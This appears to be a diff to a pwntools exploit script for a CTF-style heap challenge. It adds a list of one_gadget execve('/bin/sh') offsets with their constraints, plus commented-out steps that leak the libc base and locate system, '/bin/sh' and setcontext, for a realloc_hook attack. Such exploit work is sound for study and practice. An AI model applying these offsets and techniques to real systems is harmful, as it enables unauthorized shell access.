@@ -107,6 +107,34 @@ io.interactive()
 # use reallochook
 # payload = "a"*(19-8) + p64(one) + p64(libc.symbols['realloc'] + offset)
 
+"""
+0x45226 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4527a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf0364 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1207 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+"""
+
+# libc_addr       = u64(rv(io, 6) + b'\0\0')
+# lg("libc_addr", libc_addr)
+# libc.address    = libc_addr - 0x3c4b78  # unsorted bin offset 
+# libc.address    = u64(rv(io, 6) + b'\0\0') - libc.symbols['puts']
+# lg("libc.address", libc.address)
+# binsh_addr      = next(libc.search("/bin/sh\0"))
+# system_addr     = libc.symbols['system']
+# sc_53           = libc.symbols['setcontext'] + 53
+
+
 # <realloc>       push   r15
 # <realloc+2>     push   r14
 # <realloc+4>     push   r13
